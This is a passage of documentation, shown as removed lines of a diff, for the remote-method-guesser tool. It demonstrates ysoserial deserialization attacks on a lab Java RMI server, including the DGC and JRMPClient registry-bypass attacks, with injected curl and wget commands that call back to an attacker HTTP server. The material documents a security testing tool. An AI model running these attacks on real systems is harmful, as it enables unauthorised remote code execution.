-[example-server](https://github.com/qtc-de/beanshooter/packages/398561) of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running
-an unpatched version of *Java*. The following output shows that *remote-method-guesser* successfully identifies the missing *JEP 290* installation:
-
-```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010
-[+] Creating RMI Registry object... done.
-[+] Obtaining list of bound names... done.
-[+] 1 names are bound to the registry.
-[+] RMI object tries to connect to different remote host: iinsecure.dev
-[+] 	Redirecting the ssl connection back to 172.18.0.2... 
-[+] 	This is done for all further requests. This message is not shown again. 
-[+] 
-[+] Listing bound names in registry:
-[+] 
-[+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 
-[+] RMI server codebase enumeration:
-[+] 
-[+] 	- The remote server does not expose any codebases.
-[+] 
-[+] RMI server String unmarshalling enumeration:
-[+] 
-[+] 	- Server attempted to deserialize object locations during lookup call.
-[+] 	  --> The type java.lang.String is unmarshalled via readObject().
-[+] 
-[+] RMI server useCodebaseOnly enumeration:
-[+] 
-[+] 	- Caught ClassCastException during lookup call.
-[+] 	  --> The server ignored the provided codebase (useCodebaseOnly=true).
-[+] 
-[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
-[+] 
-[+] 	Caught AccessException during unbindcall.
-[+] 	The servers seems to use a SingleEntryRegistry (probably JMX based).
-[+] 
-[+] RMI server DGC enumeration:
-[+] 
-[+] 	- RMI server does not use a SecurityManager during DGC operations.
-[+] 	  Remote class loading attacks are not possible.
-[+] 
-[+] RMI server JEP290 enumeration:
-[+] 
-[+] 	- DGC accepted deserialization of java.util.HashMap (JEP290 is not installed).
-```
-
-To confirm that the server is vulnerable you can perform a dedicated *deserialization attack* on the *DGC level* (*DGC* = *Distributed Garbage Collector*,
-a *remote object* that is available on almost each *RMI endpoint*). This can be done
-by using the ``dgc`` action of *remote-method-guesser*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:
-
-```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
-[+] Creating ysoserial payload... done.
-[+] Attempting ysoserial attack on DGC endpoint...
-[+] 
-[+] 	Caught ClassCastException during deserialization attack.
-[+] 	Deserialization attack most likely worked :)
-
-[...]
-
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.18.0.2 - - [27/Dec/2020 06:16:00] code 404, message File not found
-172.18.0.2 - - [27/Dec/2020 06:16:00] "GET /vulnerable HTTP/1.1" 404 -
-```
-
-The callback from the server shows that the attack was successful. With *JEP290* installed, the server would have rejected the deserialization instead.
-
-Whereas the deserialization filter on the *DGC* is very strict and there are currently no known bypasses, the *RMI registry* itself needs to allow more
-classes to be deserialized in order to work correctly. This was abused for some bypasses in the past, where the two most prominent bypasses are the
-*JRMPClient* gadget of the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java) and
-the [RemoteObjectInvocationHandler bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) by [An Trinh](https://twitter.com/_tint0).
-Both of them can be used together with *remote-method-guesser's* ``reg`` action and possibly bypass an outdated *JEP290* installation.
-
-Notice that both bypass gadgets cannot be used to execute code directly. Instead they create an outbound *RMI* connection, which is no longer protected
-by the deserialization filters. This outbound channel can now be used for deserialization attacks. The most common way to do this is probably using
-[ysoserials JRMPListener](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) and since it is so common,
-*remote-method-guesser* has builtin a shortcut (``listen``) to launch this listener.
-
-```console
-[qtc@kali ~]$ rmg 172.18.0.2 9010 reg JRMPClient 172.18.0.1:4444
-[+] Creating ysoserial payload... done.
-[+] 
-[+] Attempting deserialization attack on RMI registry endpoint...
-[+] 
-[+] 	Caught ClassCastException during deserialization attack.
-[+] 	The server uses either readString() to unmarshal String parameters, or
-[+] 	Deserialization attack was probably successful :)
-
-
-[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "wget 172.17.0.1:8000/vulnerable"
-[+] Creating a JRMPListener on port 4444.
-[+] Handing off to ysoserial...
-* Opening JRMP listener on 4444
-Have connection from /172.18.0.2:40704
-Reading message...
-Is DGC call for [[0:0:0, -1407888899]]
-Sending return with payload for obj [0:0:0, 2]
-Closing connection
-
-
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.18.0.2 - - [08/Jan/2021 08:43:14] "GET /vulnerable HTTP/1.1" 200 -
-```
